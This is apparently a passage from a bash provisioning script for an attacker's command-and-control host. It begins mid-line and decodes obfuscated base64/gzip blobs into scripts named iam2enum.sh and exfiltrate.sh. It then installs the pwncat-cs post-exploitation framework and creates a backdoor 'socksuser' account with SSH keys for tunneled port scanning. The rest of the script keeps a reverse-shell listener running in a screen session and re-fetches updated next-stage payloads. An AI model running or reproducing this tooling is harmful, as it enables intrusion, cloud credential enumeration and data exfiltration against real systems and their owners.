SKFKIaIu5uKrNtDSJlqmBfRBXK6EVNCFsyIdlU8q3PbYitWbWaidwbDims29rIhshVEcb0AD+AYY3c8KqddrMEzaRLYevZNuhhC4t2mJA8E6ZOK1QeZEkLKp1h+Cfps1WQ0qJXTAQUwuY1Wfv9/gZgJecVnv2/MWKNP/dK1VkDjXUWOXc0ZVJyQ0XGlRPub+yWZ6fvfnjEwZK3377YP3w4aES84q4WnXpjuHJgaaq9clC+nHJT6z/6/d3Ho+Pjs8vTi4+nlycvx+ejzXjurWGN+QLU4FH/aEPzqLdR0dzitGYdIv6WM/qRRVOpfYbwteOG1S+A77rUptq7uuV3yKTU8EobR8PUE6O1S2p8c4x6radGryw3WMNxDsravv4LAAD//wEAAP//CHqXjYoHAAA= | base64 -d | gunzip > resources/iam2enum.sh
echo H4sIAAAAAAAA/7RWcW/bthP9X5/i6hhxDPwUIvklLZbBA7JU2bwEaRFnKIqhEBjpZNOWSJmk7GRt99kHSrJMWbHrLLH/sXE8vscz7z3eHoRM0fsYIaVDlA4+pEJqOP808D+e/+bd9lotx2ERvIFAJAnlIbgzGE9/Bj1C7gAEmYzBvf4DXAEkU5LEIqAxuWecjKcw0jpVZ4QMmR5l94eBSMh4GlM+JOMpkRgjVahIKOY8FjQk46l7dPjOfMWMZw8uTcK3J7C/D8EoESG8Oz1tcjgRc5w9+B3jFCVEGQ80Exy0gCwNqUZTCgSCR2yYSZqvmSoCiSFyzWisIGIxKmeRgz6dq4MufHUAAHIqSKUwSb32kRWkQYBK+RN87LWPrbjCQKIu4v+vxZVigvtaTJD32ifWksQhE7zXPnXyYDIJmQQ3hX/IIZ2rPMYi+AvegPs3tNpL5hZ8qa6i+NC5qspFUKhNxF/u8Fm4guC6VXnljxwsYg3eZWXb8pY7lnQrKM/htv697emtTU2Q7dmLC9qGtsi0tqwn+W4a9xa1ZDjDoisrqCCTErmGTKGsNWumGB/mTX1x3beattzgmw1V97LIlq057P4vQEKcEZ7F8Uote+AV4m/S1cssPMK10iqMop3Niuq1D360DVw3EjKhGpDPXC7cIqXrWGf6SKVCc1BYz2cr8QCDkYBWOz9DC77BUGIKHWNo5xcX3mDgX3mf/f77DnyDINPghtDpdcCN4Li7AmsLeQPswLu49e4s9K2ga16wEX0w6H+48e8+XHk3WyAvrOSgcGaVe/AZIUdvfzo8Pj05LL9JTDUqTRLU1A2ppiSNaYAJck0KiNot/Fnewahps8sLNgmdECOaxboDdrObT81foUxbsaK6OTT0WokqB8VYoXXESxrH9zSYmDMhnzEpuKkGZlQy88Apo4ZSN8AUcKEhlaiQ6woll7xr1NvolxZ8MS+Rtdy496Y9bKr7CYa1uIsFqxVM8OV33KqOWpreD2yJcaUpD3BxuzVRLitdpPll2spzurr8H7qV0YQoDDLJ9KNtKaTr1H2ojL8mRXv1/N01U4Et63JzJe7WeZ54hY/90ATpfALuJXTgDDrQ+QqpZFxD+xi+G9FrmWv+f+b3A5VD1V0zcGykHOSJFfGLadd6WIP5rhDwi/he29nqwqw62zIksOwI6mYEpRVtfsQF15RxlGSO98Dyv0U/PvG+PulX9uO+APIXIJWi9uBihMHEWJfMODdojANdctfA50yPoHaYvBprxKzs7ZP3q99/793c9e8+F5bjX/avvabJPWvIeK1BYxfDxjYDxw6Hjh0PHrsdPnY7gDx3CKmavzmGNJW/VMoLhpHGE/r0ZL7hjdwo938BAAD//wEAAP//jswpiqcPAAA= | base64 -d | gunzip > resources/exfiltrate.sh
    log "installing required python3.9..."
    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip "packaging>=24" "ordered-set>=3.1.1" "more_itertools>=8.8" "jaraco.text>=3.7" "importlib_resources>=5.10.2" "importlib_metadata>=6" "tomli>=2.0.1" "wheel>=0.43.0" "platformdirs>=2.6.2" setuptools wheel setuptools_rust jinja2 jc >> $LOGFILE 2>&1
    python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    if ! [ -e /home/socksuser/.ssh/socksuser_key ]; then
        log "adding tunneled port scanning user - socksuser..."
        adduser --gecos "" --disabled-password "socksuser" || log "socksuser user already exists"
        log "adding ssh keys for socks user..."
        mkdir -p /home/socksuser/.ssh 2>&1 | tee -a $LOGFILE
        ssh-keygen -t rsa -N '' -b 4096 -f /home/socksuser/.ssh/socksuser_key 2>&1 | tee -a $LOGFILE
        cat /home/socksuser/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys 2>&1 | tee -a $LOGFILE
        chown -R socksuser:socksuser /home/socksuser
        chmod 600 /home/socksuser/.ssh/authorized_keys 2>&1 | tee -a $LOGFILE
        log "socksuser setup complete..."
    fi
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        for i in `seq $((MAXLOG-1)) -1 1`; do mv "$PWNCAT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
        mv $PWNCAT_LOG "$PWNCAT_LOG.1" 2>/dev/null || true
        log "starting background process via screen..."
        screen -S $PWNCAT_SESSION -X quit
        screen -wipe
        screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m /bin/bash -c "cd /pwncat && python3.9 listener.py --port=\"reverse_shell_port\" --host=\"reverse_shell_host\" --payload=\"payload\""
        screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
        log "Checking for listener..."
        TIMEOUT=1800
        START_TIME=$(date +%s)
        while true; do
            CURRENT_TIME=$(date +%s)
            ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
            if grep "listener created" $PWNCAT_LOG; then
                log "Found listener created log in $PWNCAT_LOG - checking for port response"
                while ! nc -z -w 5 -vv 127.0.0.1 listen_port > /dev/null; do
                    log "failed check - waiting for pwncat port response: 127.0.0.1:listen_port";
                    sleep 30;
                    if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
                        log "payload update detected - exiting loop and forcing payload download"
                        rm -f /tmp/payload_$SCRIPTNAME
                        break 3
                    fi
                done;
                log "Sucessfully connected to 127.0.0.1:listen_port"
                break
            fi
            if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
                log "Failed to find listener created log for pwncat - timeout after $TIMEOUT seconds"
                exit 1
            fi
        done
        log "responder started."
        log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
        sleep 1800
        log "sleep complete - checking for running sessions..."
        while [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; do
            log "pwncat session still running - waiting before restart..."
            sleep 600
        done
        log "no pwncat sessions found - continuing..."
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break
        else
            log "restarting loop..."
        fi
    done
fi
log "done."

log "done next stage payload execution."

log "Done"